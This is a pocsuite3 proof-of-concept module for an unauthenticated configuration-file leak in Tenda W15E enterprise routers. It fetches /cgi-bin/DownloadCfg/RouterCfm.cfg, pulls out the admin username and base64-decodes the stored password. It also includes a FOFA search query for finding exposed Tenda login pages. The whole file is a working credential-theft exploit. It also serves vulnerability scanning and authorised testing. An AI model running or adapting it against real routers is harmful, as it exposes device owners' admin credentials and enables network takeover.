"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '9'  
    author = ['PeiQi']
    name = 'Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞'
    vulType = VUL_TYPE.PATH_DISCLOSURE
    desc = '''Tenda 企业级路由器 RouterCfm.cfg 配置文件可在未授权的情况下被读取，导致账号密码等敏感信息泄漏
    '''
    appPowerLink = 'Tenda'
    appName = 'Tenda'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'title=="Tenda | Login" && country="CN"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/cgi-bin/DownloadCfg/RouterCfm.cfg"
        headers = {
           "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'sys.userpass' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['User/Pass'] = re.findall(r'sys.username=(.*)' ,resp.text)[0] + "/" + str(base64.b64decode(re.findall(r'sys.userpass=(.*)', resp.text)[0]), 'utf8')
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)